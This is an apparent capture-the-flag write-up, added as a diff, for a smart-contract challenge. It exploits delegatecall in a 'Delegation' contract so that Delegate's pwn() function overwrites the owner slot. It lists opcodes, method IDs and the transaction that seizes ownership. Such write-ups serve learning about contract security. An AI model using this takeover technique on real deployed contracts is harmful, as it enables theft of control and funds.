@@ -1,0 +1,57 @@
+The issue in this contract come from the delegatecall.
+
+the Delegation contract will make a call of the Delegate function, by using delagatecall
+But instead of modifying Delegate storage it will modify hix own storage.
+As "owner" variable address have the same position in the storage of both contract
+a call to pwn() will modify the "owner" variable of Delegation not Delegate
+
+
+As pwd() is a fallback of Delegate, and the delegatecall is made in the fallback of Delegation
+We just need to send a transaction to Delegation contract and pass the methodID to it
+
+To find the methodID we can look at the stack of Delegat contract
+
+contract Delegation  -> addr: 0x8d0B95DE0753b92badaBBb4612440C44522a9Eff
+
+contract Delegate -> addr: 0x18D36e5B5d6fD3Bd3A450395785D68515aA1963E
+
+OP Code of Delegate : 
+
+PUSH1 0x60
+PUSH1 0x40
+MSTORE
+PUSH4 0xffffffff
+PUSH29 0x0100000000000000000000000000000000000000000000000000000000
+PUSH1 0x00
+CALLDATALOAD
+DIV
+AND
+PUSH4 0x8da5cb5b
+DUP2
+EQ
+PUSH1 0x46
+JUMPI
+DUP1
+PUSH4 0xdd365b8b
+EQ
+PUSH1 0x7f
+JUMPI
+
+
+if we call: contract.sendTransaction({from: player, to: contract.address, data: "0x8da5cb5b"})
+
+the result in etherscan is the following
+
+Input Data:
+
+Function: owner() ***
+
+MethodID: 0x8da5cb5b
+
+if we call contract.sendTransaction({from: player, to: contract.address, data: "0xdd365b8b"})
+
+Function: pwn() ***
+
+MethodID: 0xdd365b8b
+
+We have succefully been promot owner of the contract
